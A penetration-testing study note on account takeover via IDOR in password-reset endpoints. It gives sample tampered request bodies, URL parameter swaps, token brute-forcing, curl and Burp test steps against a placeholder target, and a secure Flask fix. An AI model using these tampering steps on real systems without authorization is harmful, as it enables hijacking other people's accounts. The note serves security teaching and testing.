---
tags: [vapt, access-control, idor, advanced]
difficulty: advanced
module: "21 - Access Control"
topic: "21.18 Account Takeover via IDOR on Password Reset"
---

# 21.18 — Account Takeover via IDOR on Password Reset

## IDOR on Password Reset = Account Takeover

```
WHY THIS IS HIGH SEVERITY:
  Normal IDOR: read another user's data → privacy violation
  IDOR on PASSWORD RESET: set another user's password → ACCOUNT TAKEOVER!
  
  Password reset endpoints are especially sensitive:
  - They're designed to bypass normal authentication
  - Success = full account control
  
  IF THESE ENDPOINTS HAVE IDOR:
  → Attacker can reset ANY user's password to their own choice
  → Full account takeover without knowing any credentials!
```

---

## Attack Pattern 1: User ID in Reset Request

```
RESET FLOW WITH IDOR:
  Step 1: POST /forgot-password
  {"email": "attacker@evil.com"}
  → Token sent to attacker's email: TOKEN123
  
  Step 2: POST /reset-password
  {"token": "TOKEN123", "user_id": 42, "new_password": "Hacked!"}
  
  ATTACK: Change user_id to victim's ID:
  {"token": "TOKEN123", "user_id": 43, "new_password": "Hacked!"}
  
  Token is valid (for attacker's account)
  user_id says: reset user 43's password
  
  IF SERVER DOESN'T VERIFY: "Does TOKEN123 belong to user 43?"
  → It accepts → resets VICTIM's password!
  
  IMPACT: Critical account takeover
```

---

## Attack Pattern 2: Account ID in URL

```
RESET URL IN EMAIL:
  /reset-password?token=TOKEN123&account_id=42
  
  ATTACK: Change account_id:
  /reset-password?token=TOKEN123&account_id=1  ← admin!
  
  If token is not tied to specific account → resets account_id 1!
  
  ALSO TEST:
  /reset-password?token=TOKEN123&user_id=1
  /reset-password?token=TOKEN123&email=admin@company.com
  /reset-password?token=TOKEN123&username=admin
```

---

## Attack Pattern 3: Email Parameter Manipulation

```
RESET FLOW:
  POST /verify-reset-token
  {"token": "TOKEN123"}
  
  Server response:
  {"status": "valid", "user_id": 42, "email": "attacker@evil.com"}
  
  Client then POSTs:
  POST /complete-reset
  {"token": "TOKEN123", "user_id": 42, "email": "attacker@evil.com", "password": "new"}
  
  ATTACK:
  POST /complete-reset
  {"token": "TOKEN123", "user_id": 43, "email": "victim@company.com", "password": "Hacked!"}
  
  If server trusts user_id from body → victim's password reset!
```

---

## Attack Pattern 4: Race Condition on Token

```
SCENARIO:
  Token generation: sequential or timestamp-based
  Token = short (4-6 digits numeric)
  
  Token for attacker: 123456
  Token for victim (requested at similar time): 123457? or 123455?
  
  ATTACK:
  Trigger victim's password reset (via forgot-password form)
  Guess token by brute force (or enumerate nearby values)
  
  POST /reset-password
  {"token": "123455", "new_password": "Hacked!"}
  
  → If token for victim → resets victim's password!
  
  (This is more of a token predictability issue than IDOR)
```

---

## Attack Pattern 5: Email Address Confusion

```
SOME APPS IDENTIFY ACCOUNT BY EMAIL IN BODY (not by token):

POST /reset-password
{"token": "TOKEN123", "email": "attacker@evil.com", "password": "new"}

ATTACK:
POST /reset-password
{"token": "TOKEN123", "email": "admin@company.com", "password": "Hacked!"}

IF: Token is valid for attacker, but email lookup changes the target:
→ admin@company.com's password reset!

ALSO:
Email case sensitivity issues:
"Admin@Company.com" vs "admin@company.com" → same account?
→ Try submitting victim's email in different cases
```

---

## Testing Password Reset IDOR

```bash
# SETUP: Two accounts
# Account A (attacker): attacker@evil.com (you control this)
# Account B (victim): victim@company.com (separate test account)

# STEP 1: TRIGGER RESET FOR YOUR OWN ACCOUNT:
curl -X POST https://target.com/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
# → Check your email for reset link/token

# STEP 2: CAPTURE RESET REQUEST IN BURP:
# Visit reset link → Burp intercepts
# Note ALL parameters: token, user_id, email, etc.

# STEP 3: TEST USER_ID MANIPULATION:
# In Burp Repeater, modify the reset request:
# Original: {"token": "abc123", "user_id": 42, "password": "new"}
# Attack:   {"token": "abc123", "user_id": 43, "password": "Hacked!"}
# → Check if victim's password was changed!

# STEP 4: VERIFY SUCCESS:
# Try logging in as victim with "Hacked!" password
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@company.com", "password": "Hacked!"}'
# → Login success? → CRITICAL BUG: Account Takeover via IDOR!

# STEP 5: TEST ALL ID-LIKE PARAMETERS IN RESET FLOW:
# user_id, account_id, uid, id, email, username
# Try each with victim's values

# STEP 6: TEST THE FORGOT-PASSWORD STEP TOO:
# Some apps leak user_id in the forgot-password response:
curl -X POST https://target.com/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
# Response: {"status": "ok", "user_id": 42}  ← note: user_id exposed!
# → Now you know victim's user_id → use in reset step
```

---

## Fix

```
SECURE PASSWORD RESET:

THE KEY PRINCIPLE:
  Token must be CRYPTOGRAPHICALLY TIED to specific user
  → Token alone is enough to identify the user
  → NEVER need user_id, email, or any other identifier in the reset request!

# CORRECT IMPLEMENTATION:

# Step 1: Generate reset token:
import secrets, hashlib
from datetime import datetime, timedelta

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email = request.json['email']
    user = db.get_user_by_email(email)
    
    if user:  # Don't reveal if email exists → same response either way!
        token = secrets.token_urlsafe(32)  # 256-bit random
        # Store token TIED to user:
        db.store_reset_token(
            user_id=user.id,
            token_hash=hashlib.sha256(token.encode()).hexdigest(),
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        send_reset_email(email, token)
    
    # Same response regardless of whether email exists:
    return jsonify({"status": "If that email exists, a reset link was sent"})

# Step 2: Reset password using token ONLY:
@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.json.get('token')
    new_password = request.json.get('password')
    
    # Look up user by TOKEN (not by user_id/email from request!):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    reset_entry = db.get_valid_reset_token(token_hash)  # checks expiry too!
    
    if not reset_entry:
        abort(400, "Invalid or expired reset token")
    
    # User is identified by the token → no need for user_id in request!
    user_id = reset_entry.user_id
    
    db.update_password(user_id, hash_password(new_password))
    db.invalidate_reset_token(token_hash)  # single use!
    
    return jsonify({"status": "Password reset successful"})

# NO user_id, email, or any identifier in the /reset-password request!
# Token alone identifies the user!
```

---

## Related Notes
- [[03 - IDOR — Insecure Direct Object Reference]] — IDOR fundamentals
- [[16 - Authentication — Forgot Password Token Reuse]] — token reuse issues
- [[02 - Horizontal Privilege Escalation]] — horizontal escalation context
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
